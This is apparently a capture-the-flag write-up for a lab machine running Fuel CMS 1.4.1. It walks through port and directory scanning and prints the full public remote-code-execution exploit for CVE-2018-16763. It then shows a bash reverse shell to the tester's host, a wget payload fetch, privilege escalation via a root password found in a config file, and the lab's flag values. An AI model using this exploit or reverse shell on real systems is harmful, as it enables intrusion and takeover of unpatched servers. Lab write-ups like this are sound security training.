# Ignite

- **I've converted my Victim Ip to - ignite.thm**
```sh
sudo nano /etc/hosts
```

## Recon
### Port Scanning
```sh
└─$ sudo nmap -sS -sV -O -oA exploits ignite.thm >> ports.txt

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))


```


### Post Scanning
- As port 80 is open it means there is a webserver there

![alt text](image.png)

- **In the site there are many information there**

### Aggressive Port Scan

```sh
└─$ sudo nmap -A -p 80 ignite.thm >> aggresive.txt                 


Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-29 14:30 EDT
Nmap scan report for ignite.thm (10.10.82.45)
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry 
|_/fuel/


```
- **`/fuel/` this seems very unusual**
- **Lets have a try with the website**


### Directory Enum
```sh
└─$ gobuster dir -u http://ignite.thm -w /usr/share/wordlists/dirb/common.txt -o directory.txt

/.hta                 (Status: 403) [Size: 289]
/.htpasswd            (Status: 403) [Size: 294]
/@                    (Status: 400) [Size: 1134]
/.htaccess            (Status: 403) [Size: 294]
/0                    (Status: 200) [Size: 16591]
/assets               (Status: 301) [Size: 309] [--> http://ignite.thm/assets/]
/home                 (Status: 200) [Size: 16591]
/index                (Status: 200) [Size: 16591]
/index.php            (Status: 200) [Size: 16591]
/lost+found           (Status: 400) [Size: 1134]
/offline              (Status: 200) [Size: 70]
/robots.txt           (Status: 200) [Size: 30]
/server-status        (Status: 403) [Size: 298]


```
- **Lets try this one `robots.txt`**

![alt text](image-1.png)

- **Its indicating the same `/fuel/` directory**

- **But in the main website there is a direction about the `/fuel`**

![alt text](image-2.png)

![alt text](image-3.png)

- **There are many things are in there**
- **I tried .php reverse shell into all the upload sections but doesn't happened anything**

### SearchSploit
```sh
└─$ searchsploit "fuel cms 1.4"
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                                                                            | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                                                                            | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                                                                            | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                                                                           | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                                                                  | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                                                                      | php/webapps/48778.txt
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
- **Lets use the first python exploit**

```sh
└─$ searchsploit -m 47138      
  Exploit: fuel CMS 1.4.1 - Remote Code Execution (1)
      URL: https://www.exploit-db.com/exploits/47138
     Path: /usr/share/exploitdb/exploits/linux/webapps/47138.py
    Codes: CVE-2018-16763
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/bc-here/CTF{}/THM/Ignite/47138.py

```

### 47138 Exploit
```sh
└─$ cat 47138.py     
# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1)
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763


import requests
import urllib

url = "http://127.0.0.1:8881"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = raw_input('cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
	proxy = {"http":"http://127.0.0.1:8080"}
	r = requests.get(burp0_url, proxies=proxy)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print r.text[0:dup]                                                                                                                                                                        
```
- **Lets change the IP with My Victim's IP**
```sh
import requests
import urllib

url = "http://10.10.82.45:80"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
        xxxx = raw_input('cmd:')
        burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29>
        #proxy = {"http":"http://127.0.0.1:8080"}
        r = requests.get(burp0_url) #, proxies=proxy)

        html = "<!DOCTYPE html>"
        htmlcharset = r.text.find(html)

        begin = r.text[0:20]
        dup = find_nth_overlapping(r.text,begin,2)

        print r.text[0:dup]

```
- **As I don't need the proxy here how I make it as a comment**

```sh
└─$ python2 47138.py         
cmd:whoami
systemwww-data

```
- **Its running on python2**
- **Though there is a php error handling issue it working well**

```sh
cmd:ls
systemREADME.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt

cmd:which bash
system/bin/bash


```
- **There is bash so we can try the reverse shell of bash**

![alt text](image-4.png)
- [Link](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- **I'm using pentestMonkeys rev. shell**

```sh
bash -i >& /dev/tcp/<My local IP>/8080 0>&1
```
- **I tried to directly inject the shell to the victim machine but its not giving me any resources**
- **Lets try it with wget through my machine by the python server**

```sh
cmd: wget http://10.17.88.30/welcome.sh

```
- **In the welcome.sh file I included my script**

```sh
cmd:chmod +x welcome.sh

```
```sh
└─$ nc -nlvp 8080
listening on [any] 8080 ...

```
- **Here my netcat is open**

```sh
cmd:bash welcome.sh

```

```sh
└─$ nc -nlvp 8080
listening on [any] 8080 ...
connect to [10.17.88.30] from (UNKNOWN) [10.10.82.45] 34508
bash: cannot set terminal process group (957): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html$ 
```

# I'm in
- **Its actually the normal users end**

```sh
www-data@ubuntu:/var/www/html$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
www-data
www-data@ubuntu:/home$ cd www-data
cd www-data
www-data@ubuntu:/home/www-data$ ls
ls
flag.txt
www-data@ubuntu:/home/www-data$ cat flag.txt
cat flag.txt
6470e394cbf6dab6a91682cc8585059b 

```

> ### user.txt : `6470e394cbf6dab6a91682cc8585059b`

## Privilege Escalation
```sh
www-data@ubuntu:/home/www-data$ sudo -l
sudo -l
sudo: no tty present and no askpass program specified

```
- **Its simply means that we don't have the terminal shell we have to get the terminal shell**

### Getting the terminal Shell
```sh
python -c "import pty; pty.spawn('/bin/bash')"

stty raw -echo

www-data@ubuntu:/var/www/html$ sudo -l         
[sudo] password for www-data: 


```

- **Its seeking pass word now**

- **Remember! there was a hint of the data-base of the webserver**
![alt text](image-5.png)
- **Lets get into it**

- **In the `www-data@ubuntu:/var/www/html/fuel/application/config$` directory we get the password**
```sh
'username' => 'root',
'password' => 'mememe',

```

```sh
www-data@ubuntu:/var/www/html/fuel/application/config$ su root
Password: mememe

root@ubuntu:/var/www/html/fuel/application/config# cd /root
root@ubuntu:~# ls
root.txt
root@ubuntu:~# cat root.txt
b9bbcb33e11b80be759c4e844862482d 

```
> ### root.txt: `b9bbcb33e11b80be759c4e844862482d`
